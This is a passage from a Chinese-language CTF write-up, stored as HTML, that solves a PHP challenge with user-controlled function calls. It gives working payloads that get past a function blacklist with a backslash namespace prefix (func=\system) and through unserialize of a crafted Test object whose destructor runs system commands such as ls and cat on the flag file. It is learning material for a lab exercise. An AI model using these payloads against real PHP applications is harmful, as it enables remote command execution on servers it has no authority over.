?&gt;</span><br></pre></td></tr></table></figure>\n<p>尝试用相对路径读有没有flag.php这东西。。没试出来。。就去网上找了下wp。感觉已经很接近结果了有点不甘心😔感谢这位师傅的文章：<br><code>https://blog.csdn.net/qq_58784379/article/details/120877859</code><br>第一种方法：<br>在PHP中的函数前面加个\\并不印象函数运行(php内的” \\ “在做代码执行的时候，会识别特殊字符串，绕过黑名单)。拿前面那个is_callable函数举个例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$callback = &#x27;include&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (\\is_callable($callback)) &#123;</span><br><span class=\"line\">    echo &#x27;可以回调&#x27;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    echo &#x27;不可回调&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//结果仍是不可回调</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>问了下GPT，这个\\是一种命名空间限定符，用于告诉 PHP 解释器要使用全局命名空间中的函数，而不是当前命名空间中的函数。如果没有使用命名空间或没有同名函数存在于全局命名空间中，添加反斜杠将没有实际影响。<br><code>func=\\system&amp;p=find / -name &quot;flag*&quot;//跟以前做的题一样，只要用find找东西就是全磁盘查找，会很慢</code><br>回显：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png\" alt=\"image\"><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png\" alt=\"image\"><br>读最底下这个<code>/tmp/flagoefiu4r93</code>：<br><code>func=file_get_contents&amp;p=/tmp/flagoefiu4r93</code><br>或者<code>func=\\system&amp;p=cat /tmp/flagoefiu4r93</code><br>得flag<br>第二种方法用了反序列化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Test &#123;</span><br><span class=\"line\">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class=\"line\">        var $func = &quot;date&quot;;</span><br><span class=\"line\">        function __destruct() &#123;</span><br><span class=\"line\">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class=\"line\">                echo gettime($this-&gt;func, $this-&gt;p); //命令执行</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">//这东西没被用过，因为Test类里包含一个__destruct函数，这函数在对象被销毁时会被调用，</span><br></pre></td></tr></table></figure>\n<p>我们想执行system(‘ls’)而且要绕过对func的黑名单检测，可以先序列化要执行的命令，然后利用get函数反序列化要执行的命令，反序列化后要销毁变量时会调用__destruct函数，这个函数定义了func(要执行的命令)和p(要执行命令的参数)，然后再调用一次gettime函数(又执行了一次命令)。一来一回执行了两次gettime。<br>先序列化我们要执行的命令和参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Test &#123;</span><br><span class=\"line\">       var $p = &quot;ls&quot;;</span><br><span class=\"line\">       var $func = &quot;system&quot;;</span><br><span class=\"line\">       </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = new Test();</span><br><span class=\"line\">\t</span><br><span class=\"line\">$b = serialize($a);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $b;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//结果：O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>payload:<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;// 看当前目录下有什么文件</code><br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png\" alt=\"image\"><br>OK，没啥问题，因为根据第一种做法已经知道了flag藏在哪，直接去找<code>/tmp/flagoefiu4r93</code>把我们的命令序列化一下：<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code><br>结果：<br><img src=\"https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png\" alt=\"image\"></p>\n","categories":[],"tags":[]}